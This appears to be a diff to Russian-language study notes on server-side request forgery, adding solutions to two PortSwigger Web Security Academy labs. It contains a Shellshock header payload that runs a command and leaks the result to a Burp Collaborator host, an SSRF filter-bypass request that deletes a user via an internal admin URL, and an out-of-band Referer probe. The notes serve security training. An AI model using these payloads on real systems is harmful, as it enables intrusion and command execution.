@@ -96,8 +96,39 @@ DNS rebinding attack framework: [nccgroup/singularity](https://github.com/nccgro
 
 ## Blind SSRF
 
-Подробнее: [PayloadsAllTheThings/SSRF#Bliend SSRF](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-ssrf)
+Подробнее: [PayloadsAllTheThings/SSRF#blind-exploitation]([PayloadsAllTheThings/Server Side Request Forgery at master · swisskyrepo/PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery#blind-exploitation))
 
 #### Shell Shock
 User-Agent: `() {:;}; $(whoami).burpcollaborator.net`
 Referer: `http://192.168.0.$1$`
+
+---
+
+# Лабораторные
+
+---
+
+### Lab: SSRF with filter bypass via open redirection vulnerability
+
+https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-circumventing-defenses/ssrf/lab-ssrf-filter-bypass-via-open-redirection#
+
+```
+POST /product/stock HTTP/2
+Host: ***.web-security-academy.net
+Content-Length: 109
+
+stockApi=/product/nextProduct?currentProductId=1%26path=http://192.168.0.12:8080/admin/delete?username=carlos
+```
+
+
+
+---
+### Lab: Blind SSRF with out-of-band detection
+
+https://portswigger.net/web-security/learning-paths/ssrf-attacks/ssrf-attacks-blind-ssrf-vulnerabilities/ssrf/blind/lab-out-of-band-detection#
+
+```
+GET /product?productId=1 HTTP/2
+Host: ***.web-security-academy.net
+Referer: https://*collaborator*/
+```
